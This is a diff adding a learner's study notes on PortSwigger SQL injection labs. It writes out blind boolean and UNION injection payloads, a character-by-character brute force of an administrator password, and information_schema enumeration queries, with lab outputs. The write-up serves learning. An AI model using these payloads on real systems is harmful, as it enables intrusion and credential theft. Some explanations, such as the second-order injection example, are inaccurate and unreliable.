@@ -155,20 +155,117 @@ analysis;
   - use blind sql to exploit and extract user password
   - log in as an administrator 
   - assume pass -> contain lowecase+alphanumeric chars.ddd
+      go into repeater apply all of these payloads to see ;
+      first ; make sure that there's a tables into the database so we use this ;
+      TrackingId=edylXePlN1HEH7R9'and  (SELECT 'a' FROM users LIMIT 1)='a'--
+      second make sure there is a column called + number of it's rows > 0 ; username 
+      Cookie: TrackingId=edylXePlN1HEH7R9'and (SELECT count(*) from users where username='administrator')>0--
+      now we want to inject our payload into the intruder to know the password;we know knows that 
+      there's a table called; users+columns called; username,password we need to know the password
+      so create a brute force attack to know the password;
+        we need to know the password of the user first; 
+          so we use this  attack ;
+            TrackingId=edylXePlN1HEH7R9' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > §1§-- see whether the password bigger than the payload or not payload we change from 1;50 or whatever 
+            fromhere we found that ; length of password =19 characters 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c1e1f513-4002-4ea4-b3d4-846c367eb2d5" />
 
 
 
+      we will use this :
+       ' and  SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§'--
+ and set the first payload as number,second as bruteforce use the type of the attack ; cluster bomb as it works with two payloads
+ 
+    now let's build our attack 
+after 2 hours -> the password is   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19
+                                   s6c3nlsx945pip8jgz0
+didn't open on my  lab as it takes many hours so maybe the streaming of application stop and the password change from the insside but I underdstand the concept
 
 
+-------------------------
+now let's see : second order sql injection;
+  - you store your data legally then use this data to extract other users in the database
+  - how to do this;
+      insert into users  (user,pass) values ('nona','1234')
+      then;
+    SELECT * FROM users WHERE username = 'admin'--' now this return all users called admin whatever their password is.
 
+    ----
+    after you inject database now you can extract info about it like; version,list the tables of it.
+    SELECT @@version  (to know mysql db)  or you can ; ' UNION SELECT @@version--  
+    SELECT * FROM information_schema.tables
+lab;
+ This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
 
+To solve the lab, display the database version string.
+Hint
 
+On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
 
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 
 
+  analysis;
+  - focus on product category filter
+  - use Union attack to retrive result
+  - solution= database version stirng
 
+solution I clicked on buttons of category filter + then open that http in the repeater then run this query;
+  ?category=Clothing%2c+shoes+and+accessories +(select Null,Null from dual)-- HTTP/2  it return 200 ok that means this table dual contain two columns now how to extract version of database;
+  hit this instead of old query ;
+?category=Clothing%2c+shoes+and+accessories' UNION SELECT BANNER ,NULL FROM V$VERSION--
+note; Banner is a special column inside oracle that contain the version number + data about it.
+output;
+  CORE	11.2.0.2.0	Production
 
+outputs;
+  - once you knew the type of database+any table inside it => you started to wispeir around it by extracting it's version and soon.
 
+--
+lab;
+This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
 
+To solve the lab, display the database version string. 
+ analysis;
+  - focus on product category filter
+  - this lab used with mysql database
+  - use Union attack to retrive result
+  - solution= database version stirng
+solution;
+?category=Food+%26+Drink'+Union+select +@@version,+Null# HTTP/2
+I added from Union untill Http.
+note that  we use # as comment in database
+    - @@version -> is a variable that used to return the version of the database.
+output;
+8.0.42-0ubuntu0.20.04.1
+----
+now we need to extract the table columns + table name so we use something called; information_schema which tells us about the information of the table
+  - most database except oracle uses this;
+    - to return the name of the tables inside this database;SELECT * FROM information_schema.tables
+    - ex;SELECT * FROM information_schema.columns WHERE table_name = 'Users' this return info about table
+   
+      
 
+lab;
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
 
-  
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+Hint
+
+You can find some useful payloads on our SQL injection cheat sheet(https://portswigger.net/web-security/sql-injection/cheat-sheet)
+analysis;
+  - sql injection in product filter
+  - use UNION attack to retrieve data from other tables
+  - table contain; usernames,passwords
+  - determine the name of the table+ columns it contain->content of the tables (username,passwords)
+  - log as administrator
+  - non oracle database
+
+solution;
+  determine the type of database we use  ;
+    - +Union+select+version(),+Null--     
+    output;
+    PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+    - we know this is postgresql + contain a table but we didn't know it's name but it's contents are password,username
+      ' UNION SELECT table_name,NULL FROM information_schema.tables--
+
